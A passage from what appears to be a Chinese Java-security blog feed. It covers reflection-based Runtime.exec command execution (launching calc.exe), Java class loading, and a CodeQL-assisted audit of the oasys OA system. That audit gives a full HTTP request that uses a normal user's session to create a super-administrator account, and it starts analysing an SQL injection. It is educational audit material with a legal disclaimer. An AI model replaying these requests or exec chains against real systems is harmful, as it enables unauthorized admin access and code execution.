<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>02、反射调用（调用静态方法getRunti实例me获得Runtime实例）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line"></span><br><span class="line">Method exec = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line"></span><br><span class="line">Object getRuntime = clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz);</span><br><span class="line"></span><br><span class="line">exec.invoke(getRuntime,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>03、反射（获取私有构造方法实例化Runtime）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line"></span><br><span class="line">Method exec = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line"></span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(true);</span><br><span class="line"></span><br><span class="line">exec.invoke(m.newInstance(), &quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>





<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <tags>
        <tag>javaSec</tag>
      </tags>
  </entry>
  <entry>
    <title>类加载</title>
    <url>/blog/2024/02/20/240220%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>大多人学习Java安全是从反序列化漏洞开始说起，提到反序列化漏洞不可避免的要提一提<code>反射</code>。反射通俗易懂的说就是操作class，通过得到类的class然后做出一些操作</p>
<p>例如执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>拆开写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line"></span><br><span class="line">Method exec = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line"></span><br><span class="line">Object getRuntime = clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz);</span><br><span class="line"></span><br><span class="line">exec.invoke(getRuntime,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>可以看到要进行反射，那获取这个类是不可缺少的一步；通常来说我们有如下三种⽅式获取⼀个“类”，也就 是 <code>java.lang.Class</code> 对象：</p>
<ul>
<li><p><code>obj.getClass()</code>: 当已经存在某个类的实例对象 <code>obj</code> 时，可以通过调用 <code>obj.getClass()</code> 方法来获取该对象所属类的 <code>Class</code> 对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CodeSomeClass obj = new SomeClass();</span><br><span class="line">Class&lt;?&gt; clazz = obj.getClass();</span><br></pre></td></tr></table></figure>
</li>
<li><p>类的 <code>.class</code> 属性：如果已经加载了某个类，可以直接使用该类的 <code>.class</code> 属性来获取对应的 <code>Class</code> 对象。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CodeClass&lt;?&gt; clazz = SomeClass.class;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>Class.forName()</code>:  如果已知某个类的名字，可以使用 <code>Class.forName()</code> 来获取对应的 <code>Class</code> 对象。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javaCopy CodeClass&lt;?&gt; clazz = Class.forName(&quot;com.example.SomeClass&quot;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>今天我们要探究的主题就是<code>Class.forName()</code> 是如何通过类名（全限定类名）来获取对应的 <code>Class</code> 对象</strong></p>
<p>在此之前我们需要先了解一下<code>类加载</code>相关的知识</p>
<h2 id="0x02-类加载"><a href="#0x02-类加载" class="headerlink" title="0x02 类加载"></a>0x02 类加载</h2><p>类加载是一个很大的话题，我们重点关注的还得是跟漏洞相关的！</p>
<p>在反序列化过程中，如果要将一个序列化的对象转换回原始的对象，首先需要读取字节流中的类信息（即对象的类描述），然后根据这个类信息来动态加载类，并创建对象实例。如果类信息对应的类尚未被加载，系统会触发类加载机制来加载该类，确保能够正确地实例化对象。因此，类加载在反序列化中也扮演着重要的角色。</p>
<h3 id="2-1、类的生命周期"><a href="#2-1、类的生命周期" class="headerlink" title="2.1、类的生命周期"></a>2.1、类的生命周期</h3><p>类从被加载到虚拟机内存中开始到卸载出内存为止，它的整个生命周期可以简单概括为 7 个阶段：</p>
<ol>
<li><strong>加载（Loading）</strong>：当程序中使用某个类时，Java虚拟机（JVM）会使用类加载器将该类的.class文件加载到内存中。类加载的过程包括加载、链接和初始化等步骤。</li>
<li><strong>链接（Linking）</strong>：在链接阶段，会验证类中的字节码以确保其符合语言规范，并且会将类或接口的二进制表示合并到虚拟机的运行时状态中。链接又可细分为三个步骤：<ul>
<li><strong>验证（Verification）</strong>：确保加载的类符合Java语言规范，不会造成安全问题。</li>
<li><strong>准备（Preparation）</strong>：为类的静态变量分配内存空间，并设置默认初始值。</li>
<li><strong>解析（Resolution）</strong>：将类、方法、字段等符号引用解析为直接引用，为后续的调用做准备。</li>
</ul>
</li>
<li><strong>初始化（Initialization）</strong>：在初始化阶段，如果类具有父类，JVM会先初始化父类。然后按顺序执行静态变量的赋值操作和静态初始化块，从而完成类的初始化工作。</li>
<li><strong>使用（Usage）</strong>：在类初始化完成后，程序可以通过创建对象、调用静态方法等方式使用这个类。</li>
<li><strong>卸载（Unloading）</strong>：当一个类不再被程序所引用时，且满足一定条件（比如类加载器被回收、类型的引用已经不存在等），JVM会卸载该类，释放相关的内存空间。</li>
</ol>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/13/65cb2371aaa4a.png"  alt="image-20240213160816125"></p>
<h3 id="2-2、类加载过程"><a href="#2-2、类加载过程" class="headerlink" title="2.2、类加载过程"></a>2.2、类加载过程</h3><p><strong>Class 文件需要加载到虚拟机中之后才能运行和使用，那么虚拟机是如何加载这些 Class 文件呢？</strong></p>
<p>系统加载 Class 类型的文件主要三步：<strong>加载-&gt;连接-&gt;初始化</strong>。连接过程又可分为三步：<strong>验证-&gt;准备-&gt;解析</strong>。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/19/65d35cf6af8d8.png"  alt="image-20240219215149105"></p>
<p>在类加载阶段重点需要关注的就是<strong>类加载器</strong> 。类加载器有很多种，当我们想要加载一个类的时候，具体是哪个类加载器加载由 <strong>双亲委派模型</strong> 决定（不过，我们也能打破由双亲委派模型）。</p>
<p>每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。不过，数组类不是通过 <code>ClassLoader</code> 创建的，而是 JVM 在需要的时候自动创建的。</p>
<h3 id="2-3、类加载器"><a href="#2-3、类加载器" class="headerlink" title="2.3、类加载器"></a>2.3、类加载器</h3><p><strong>作用：</strong>加载<code>.class</code> 文件到 JVM 中（在内存中生成一个代表该类的 <code>Class</code> 对象）</p>
<blockquote>
<p>字节码的本质就是一个字节数组 []byte</p>
<p>除了加载类之外，类加载器还可以加载 Java 应用所需的资源如文本、图像、配置文件、视频等等文件资源。</p>
<p>JVM 启动的时候，并不会一次性加载所有的类，而是根据需要去动态加载。也就是说，大部分类在具体用到的时候才会去加载，这样对内存更加友好。</p>
<p>对于已经加载的类会被放在 <code>ClassLoader</code> 中。在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载。也就是说，对于一个类加载器来说，相同二进制名称的类只会被加载一次。</p>
</blockquote>
<p>1）JVM 中内置了三个重要的 <code>ClassLoader</code>：</p>
<ol>
<li>**<code>BootstrapClassLoader</code>(启动类加载器)**：最顶层的加载类，由 C++实现，通常表示为 null，并且没有父级，主要用来加载 JDK 内部的核心类库（ <code>%JAVA_HOME%/lib</code>目录下的 <code>rt.jar</code>、<code>resources.jar</code>、<code>charsets.jar</code>等 jar 包和类）以及被 <code>-Xbootclasspath</code>参数指定的路径下的所有类。</li>
<li>**<code>ExtensionClassLoader</code>(扩展类加载器)**：主要负责加载 <code>%JRE_HOME%/lib/ext</code> 目录下的 jar 包和类以及被 <code>java.ext.dirs</code> 系统变量所指定的路径下的所有类。</li>
<li>**<code>AppClassLoader</code>(应用程序类加载器)**：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。</li>
</ol>
<p><code>BootstrapClassLoader</code> 由 C++ 实现，由于这个 C++ 实现的类加载器在 Java 中是没有与之对应的类的，所以拿到的结果是 null。</p>
<p>2）那些位于网络上静态文件服务器提供的 jar 包和 class文件，<code>jdk 内置了一个 URLClassLoader</code>，用户只需要传递规范的网络路径给构造器，就可以使用 URLClassLoader 来加载远程类库了。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。</p>
<h3 id="2-4、双亲委派"><a href="#2-4、双亲委派" class="headerlink" title="2.4、双亲委派"></a>2.4、双亲委派</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/20/65d38d71b765a.png"  alt="image-20240220011840715"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/20/65d3968de84bb.png"  alt="class_loader_process"></p>
<p>每个类加载器加载过的类都有一个缓存</p>
<p>向上委托查找，向下委托加载</p>
<h3 id="2-5、类加载器的关系"><a href="#2-5、类加载器的关系" class="headerlink" title="2.5、类加载器的关系"></a>2.5、类加载器的关系</h3><p>Bootstrap 类加载器、Extension 类加载器和 System&#x2F;Application 类加载器之间的关系如下图所示：</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/20/65d3a828a6ba7.png"  alt="class_loader_relation"></p>
<p>ExtClassLoader 和 AppClassLoder 继承 URLClassLoader，而 URLClassLoader 继承 ClassLoader，BoopStrap ClassLoder 是用 C&#x2F;C++ 代码来实现的，并不继承自 java.lang.ClassLoader，它本身是虚拟机的一部分，并不是一个 Java 类。</p>
<p>JVM 加载的顺序：BoopStrap ClassLoder -&gt; ExtClassLoader -&gt; AppClassLoder</p>
<h3 id="2-6、自定义类加载器"><a href="#2-6、自定义类加载器" class="headerlink" title="2.6、自定义类加载器"></a>2.6、自定义类加载器</h3><p>类的加载过程会使用到 findLoadedClass()、loadClass()、findClass() 等方法，ClassLoader 的 loadClass() 方法源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 首先，检查类是否已经加载</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 父加载器不为空，调用父加载器的loadClass()方法</span></span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 父加载器为空则，调用 Bootstrap ClassLoader</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果仍然没有找到该类，则调用findClass()方法以找到该类</span></span><br><span class="line">                c = findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**<code>loadClass()：</code>**JVM 在加载类的时候，都是通过 ClassLoader 的 loadClass() 方法来加载 class 的，loadClass() 方法使用双亲委派模式。如果要改变双亲委派模式，可以修改 loadClass() 方法来改变 class 的加载方式。</p>
<p>**<code>findClass()：</code>**ClassLoader 通过 findClass() 方法来加载类。自定义类加载器实现这个方法来加载需要的类，比如指定路径下的文件、字节流等。</p>
<p>**<code>definedClass()：</code>**将定义的字节码文件经过字节数组流解密之后，将该字节流数组生成字节码文件，也就是该类文件的类名 .class。通常用在重写 findClass() 方法中，返回一个 Class 对象。</p>
<h2 id="0x03-案例"><a href="#0x03-案例" class="headerlink" title="0x03 案例"></a>0x03 案例</h2><p>案例入手，先准备一个Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huashu338.servlet.loderClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">qwe</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">(String food)</span>&#123;</span><br><span class="line">        System.out.println(food);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name = &quot;</span> + name + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>无参构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Person();</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/19/653126ea7e532.png"  alt="image-20231019205401740"></p>
<p>有参构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Person(&quot;zahnsan&quot;);</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/19/6531270b5db28.png"  alt="image-20231019205434987"></p>
<p>静态方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person.qwe();</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/19/65312b97064d3.png"  alt="image-20231019211358420"></p>
<p>静态参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person.id=1;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/19/65312be7c14ad.png"  alt="image-20231019211519342"></p>
<p>获取他的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = Person.class;</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/19/65312ee770fde.png"  alt="image-20231019212806943"></p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a class="link"   href="https://javaguide.cn/java/jvm/class-loading-process.html" >https://javaguide.cn/java/jvm/class-loading-process.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://anye3210.github.io/2021/08/02/%E8%AF%A6%E8%A7%A3Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/" >https://anye3210.github.io/2021/08/02/详解Java类加载过程/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://henleylee.github.io/posts/2019/b7c8c167.html#toc-heading-3" >https://henleylee.github.io/posts/2019/b7c8c167.html#toc-heading-3<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/51374915" >https://zhuanlan.zhihu.com/p/51374915<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>javaSec</tag>
      </tags>
  </entry>
  <entry>
    <title>半自动化代码审计实战</title>
    <url>/blog/2024/02/26/240226%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p><strong>文章首发于奇安信攻防社区</strong></p>
<p><strong>链接：</strong><a class="link"   href="https://forum.butian.net/share/2763" >https://forum.butian.net/share/2763<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在黑盒测试中可能会忽略一些潜在的漏洞和安全问题。而<code>代码审计</code>则可以直接查看代码、深入到代码层面对系统进行全面分析和检查其执行逻辑，从而能够发现那些黑盒测试中难以发现的问题。</p>
<p>我个人对代码审计最喜欢的方面是其能够扩大漏洞范围。在当前的模块化开发环境中，开发人员经常编写工具类和库来实现代码的复用，简化代码。当在代码审计中发现一个工具类存在漏洞时，调用该工具类的方法都有可能存在相同的漏洞。我们只需追溯<code>工具类调用处</code>，就可以轻松发现多个漏洞。</p>
<p>有一句话是这么说的”<code>没有绝对安全的系统</code>“，在这里<code>Yu9</code>借用这句话引出一个观点<code>无论我们在手工代码审计中具备多么扎实的技术背景、丰富的经验和敏锐的洞察力，仍然会存在着一些局限性</code>，例如可能会出现疏漏和错误。</p>
<p>为了克服这些局限性，使用自动化代码审计工具可以快速识别所有可疑漏洞的位置，从而提高审计的效率和准确性。然而，我们也要认识到自动化工具的使用也有一些限制。它们依赖于已知的漏洞模式和规则，并且可能无法完全覆盖所有的漏洞类型。因此，在进行代码审计时，手工审计和自动化工具的结合使用通常是更有效的方法，以确保发现尽可能多的漏洞并提高审计的准确性。</p>
<h2 id="0x02-声明"><a href="#0x02-声明" class="headerlink" title="0x02 声明"></a>0x02 声明</h2><p><strong>遵纪守法</strong><br>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。<br>一切未经授权的网络攻击均为违法行为，互联网非法外之地。<br><strong>文章转载</strong><br>转载请联系作者获得授权<br>作者公众号：安服仔Yu9</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><h3 id="审计系统"><a href="#审计系统" class="headerlink" title="审计系统"></a>审计系统</h3><p><strong>oasys</strong></p>
<p>oasys是一个OA办公自动化系统，</p>
<ul>
<li>基于springboot框架开发的项目，mysql底层数据库，前端采用freemarker模板引擎，Bootstrap作为前端UI框架。</li>
<li>集成了jpa、mybatis等框架。</li>
</ul>
<p>源码：<a class="link"   href="https://gitee.com/aaluoxiang/oa_system" >https://gitee.com/aaluoxiang/oa_system<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>由于是springboot项目，直接idea打开，配置一下数据库，Maven加载一下依赖就可以跑起来。</strong></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>CodeQL &amp; CodeQLpy</strong></p>
<p>1）CodeQl</p>
<p>CodeQL 是一个语义代码分析引擎，它可以扫描发现代码库中的漏洞。使用 CodeQL，可以像对待数据一样查询代码。编写查询条件以查找漏洞的所有变体并处理，同时可以分享个人查询条件。</p>
<p>CodeQl教程可以参考这位师傅的文章：<a class="link"   href="https://kiprey.github.io/2020/12/CodeQL-setup/" >https://kiprey.github.io/2020/12/CodeQL-setup/<i class="fas fa-external-link-alt"></i></a></p>
<p>2）CodeQLpy</p>
<p>CodeQLpy是一款基于CodeQL实现的自动化代码审计工具</p>
<p>项目地址：<a class="link"   href="https://github.com/webraybtl/CodeQLpy" >https://github.com/webraybtl/CodeQLpy<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="0x04-源码扫描"><a href="#0x04-源码扫描" class="headerlink" title="0x04 源码扫描"></a>0x04 源码扫描</h2><p>使用CodeQLpy工具扫描源码。</p>
<p>1）初始化数据库，这里直接通过源码来生成数据库，所以不需要-c参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python main.py -t D:\Desktop\oa_system-master</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b42a007.png"  alt="image-20240131011041888"></p>
<p>2）生成数据库，如果有错请忽略，最终只要看到“成功创建数据库”就可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">codeql database create out/database/oa_system-master --language=java --source-root=&quot;D:\Desktop\oa_system-master&quot; --command=&quot;D:\Desktop\CodeQLpy-master\out\decode/run.cmd&quot; --overwrite</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b5256f9.png"  alt="image-20240131011425604"></p>
<p>3）查询漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python main.py -d D:\Desktop\CodeQLpy-master\out\database\oa_system-master</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b61497d.png"  alt="image-20240131011656603"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b93d5406406.png"  alt="image-20240131021755851"></p>
<p>4）最终的会生成：csv文件，路径<code>CodeQLpy-master\out\result</code></p>
<p>可以看到结果还是很清晰的</p>
<p>Source：漏洞关键字</p>
<p>SourceFunction：漏洞所在的方法名</p>
<p>SourcePath：漏洞所在文件地址</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b93de5c3ced.png"  alt="image-20240131022021631"></p>
<h2 id="0x05-漏洞分析"><a href="#0x05-漏洞分析" class="headerlink" title="0x05 漏洞分析"></a>0x05 漏洞分析</h2><h3 id="01、硬编码、越权组合漏洞获得超级管理员权限"><a href="#01、硬编码、越权组合漏洞获得超级管理员权限" class="headerlink" title="01、硬编码、越权组合漏洞获得超级管理员权限"></a>01、硬编码、越权组合漏洞获得超级管理员权限</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b954bf5cfce.png"  alt="image-20240131035751829"></p>
<p>这块已经给了有风险的代码<code>地址和方法名</code>，快速的定位漏洞点。这里咱全局搜索（ctrl+shift+f）</p>
<p>全局搜索<code>123456</code>，定位到<code>oa_system-master\src\main\java\cn\gson\oasys\controller\user\UserController.java</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b6c7bfb.png"  alt="image-20240131012133698"></p>
<p>阅读代码得知，这个控制器是初始化用户的功能，给了一个默认密码123456</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b7b90c7.png"  alt="image-20240131013746637"></p>
<p>寻找后发现是在用户管理模块的新增功能</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b898aea.png"  alt="image-20240131014119460"></p>
<p>新增用户抓取数据包</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945b961b28.png"  alt="image-20240131014551587"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945ba54c26.png"  alt="image-20240131014723901"></p>
<p>登录一个普通用户的账号、可以看到这个用户是没有<code>用户管理</code>这个功能的。</p>
<p>抓取他的session</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945bb5f2c5.png"  alt="image-20240131013042054"></p>
<p>替换掉这个数据包中的session。注意：身份证格式要规范，我用的自己的就不展示了。</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945bcdf9c3.png"  alt="image-20240131014801196"></p>
<p>使用这个数据包的话要修改身份证哈-<code>idCard</code>参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /useredit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Sec-Fetch-Dest: iframe</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Referer: http://127.0.0.1/useredit</span><br><span class="line">Cookie: JSESSIONID=CA902F7BBA9E186241CC19593B034F47</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Content-Length: 317</span><br><span class="line"></span><br><span class="line">userName=test&amp;userTel=14444444444&amp;realName=%E5%BC%A0%E4%B8%89&amp;eamil=14444444444%40qq.com&amp;address=%E6%B2%B3%E5%8D%97&amp;userEdu=%E6%9C%AC%E7%A7%91&amp;school=%E9%83%91%E5%A4%A7&amp;idCard=xxxxxxxxxxxxxxxxxx&amp;bank=62175555555555433&amp;deptid=1&amp;sex=%E7%94%B7&amp;positionid=1&amp;roleid=3&amp;salary=1000&amp;hireTime=2024-01-30&amp;themeSkin=blue&amp;userId=</span><br></pre></td></tr></table></figure>

<p>成功创建用户，并且具有超级管理员权限</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945bda4a33.png"  alt="image-20240131013126951"></p>
<h3 id="02、sql注入"><a href="#02、sql注入" class="headerlink" title="02、sql注入"></a>02、sql注入</h3><p>可以看到有三个可以漏洞点都在<code>AddrController</code>类，先办它！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b94074450d6.png"  alt="image-20240131023116507"></p>
<p>这块是直接给出了有风险的代码位置<code>oa_system-master/src/main/java/cn/gson/oasys/controller/address/AddrController.java</code>和方法名<code>outAddress</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9404e6453c.png"  alt="image-20240131023037815"></p>
<p>可以看到调用了am的allDirector方法来处理<code>baseKey</code>，我们跟进去（ctrl+鼠标左键点击方法名）瞅瞅</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b945be3b184.png"  alt="image-20240131015857588"></p>
<p>然后就调用了数据库，这个系统使用的是mybatis，咱直接点代码前的小红鸟，跟进到xml文件瞅瞅具体的sql语句</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b946614ba70.png"  alt="image-20240131025633296"></p>
<p>mybatis在对sql语句进行预处理时：<code>#&#123;&#125;</code> 进行预处理、<code>$&#123;&#125;</code> 不进行预处理。这块在处理baseKey参数就是使用${}直接拼接。同时pinyin、outtype参数也是如此、也是拼接，也可以注入</p>
<p>找到功能点测试发现baseKey参数就是<code>外部通讯录</code>模块搜索功能的参数</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/29/65b7433ce6225.png"  alt="image-20240129141836472"></p>
<p>抓数据包</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/01/31/65b9464969e32.png"  alt="image-20240131025609200"></p>
